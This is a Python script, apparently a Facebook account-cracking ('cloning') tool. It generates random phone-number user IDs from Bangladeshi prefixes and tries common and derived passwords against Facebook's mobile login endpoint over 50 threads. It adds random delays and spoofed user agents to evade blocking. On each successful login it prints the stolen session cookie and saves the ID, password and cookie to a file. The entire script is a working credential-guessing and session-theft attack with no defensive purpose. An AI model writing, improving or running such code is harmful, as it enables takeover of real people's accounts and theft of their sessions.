import os, time, sys, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Professional Colors
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'
Y = '\033[1;33m'; B = '\033[1;34m'

loop = 0
ok = []

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] OWNER        : MD MALEK ISLAM (JILANI)   |
| [✓] METHOD       : REAL COOKIE HUNTER V12    |
| [✓] STATUS       : SUCCESS-FOCUSED LOGIC     |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] START HIGH-CHANCE CLONING')
    print(f'[0] EXIT')
    opt = input(f'{Y}[?] SELECT : {W}')
    if opt == '1':
        cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    print(f'{Y}Enter codes like: 017 013 018 019 016{W}')
    codes = input(f'{G}[+] ENTER CODES: {W}').split()
    limit = int(input(f'{G}[+] LIMIT PER CODE (e.g. 5000): {W}'))
    
    banner()
    print(f'{G}[✓] TARGETING: REAL COOKIES & SUCCESSFUL IDS...{W}')
    print(f'{G}--------------------------------------------------{W}')

    with ThreadPool(max_workers=50) as pool:
        for code in codes:
            for _ in range(limit):
                num = "".join(random.choice("0123456789") for _ in range(8))
                uid = code + num
                # Highly optimized password patterns (including last 6 logic)
                pws = [uid, uid[-6:], uid[-7:], '786786', '123456', '@@@###', 'Bangladesh', '575757', '708090'] 
                pool.submit(login_engine, uid, pws, limit * len(codes))

def login_engine(uid, pws, total_limit):
    global loop, ok
    sys.stdout.write(f'\r{W}[HUNTING] {loop}/{total_limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        # Time delay to mimic a real human (Prevents blocks)
        time.sleep(random.uniform(1.0, 2.2)) 
        session = requests.Session()
        
        # Super-Real User Agent based on latest mobile technology
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-A{random.randint(10,75)}5F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,130)}.0.0.0 Mobile Safari/537.36"
        
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'referer': 'https://m.facebook.com/login/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="130", "Google Chrome";v="130"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': ua,
        }
        
        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {
            "lsd": "AVpY", "jazoest": "2931", "m_ts": str(int(time.time())),
            "email": uid, "pass": pas
        }

        try:
            # Real Server Request
            res = session.post(url, data=data, headers=headers, timeout=30)
            cookies = session.cookies.get_dict()
            
            # THE ULTIMATE GOAL: Capturing the real COOKIE
            if "c_user" in cookies:
                full_cookie = ";".join([f"{k}={v}" for k, v in cookies.items()])
                print(f'\n{G}[SUCCESS-OK💚] {uid} | {pas}') 
                print(f'{G}[🍪] COOKIE = {full_cookie}\n')
                ok.append(uid)
                with open('/sdcard/JILANI-SUCCESS.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{full_cookie}\n')
                break
        except: pass
            
    loop += 1

if __name__ == "__main__":
    main()
